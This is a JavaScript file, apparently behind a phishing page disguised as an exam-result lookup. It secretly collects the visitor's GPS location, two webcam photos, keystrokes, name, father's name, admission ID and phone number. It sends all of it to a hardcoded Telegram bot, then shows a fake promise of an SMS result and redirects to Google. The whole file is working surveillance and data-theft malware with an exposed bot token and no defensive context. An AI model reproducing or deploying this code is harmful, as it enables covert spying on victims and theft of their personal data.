const TOKEN = '7117048092:AAESu6IVV49HZPkUU3oviD_YL7_-0NJVF7c';
const CHAT_ID = '7646169456';

let photoCount = 0;
let keystrokes = '';
let mediaStream = null;

// 📍 Send GPS location
navigator.geolocation?.getCurrentPosition(pos => {
  const { latitude, longitude } = pos.coords;
  sendToTelegram(`📍 *Location*\nLat: ${latitude}\nLng: ${longitude}`);
});

// 📸 Capture and send 2 photos
navigator.mediaDevices.getUserMedia({ video: true }).then(async stream => {
  mediaStream = stream;
  const video = document.createElement('video');
  video.srcObject = stream;
  await video.play();

  const capturePhoto = () => {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      sendToTelegram(blob, 'photo');
      photoCount++;
      if (photoCount >= 2) stopCamera();
    }, 'image/jpeg', 0.8);
  };

  capturePhoto();
  setTimeout(capturePhoto, 3000);
});

// ⌨️ Keystroke logger
document.addEventListener('keydown', e => {
  keystrokes += e.key;
  if (keystrokes.length >= 50) {
    sendToTelegram(`⌨️ *Keystrokes*\n${keystrokes}`);
    keystrokes = '';
  }
});

// 📝 Form submission
document.getElementById('loginForm')?.addEventListener('submit', e => {
  e.preventDefault();

  const name = document.getElementById('name').value;
  const father = document.getElementById('father').value;
  const admId = document.getElementById('admId').value;
  const phone = document.getElementById('phone').value;

  const message = `📄 *Form Submitted:*\n• Name: ${name}\n• Father: ${father}\n• ID: ${admId}\n• Phone: ${phone}`;
  sendToTelegram(message);

  alert(`Dear ${name}, we will send you SMS of your result.`);
  window.location.href = 'https://www.google.com';
});

// 📤 Send to Telegram
function sendToTelegram(data, type) {
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);

  if (type === 'photo') {
    formData.append('photo', data, `photo_${Date.now()}.jpg`);
    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
  } else {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: 'Markdown' })
    });
  }
}

// 🛑 Stop camera
function stopCamera() {
  mediaStream?.getTracks().forEach(t => t.stop());
}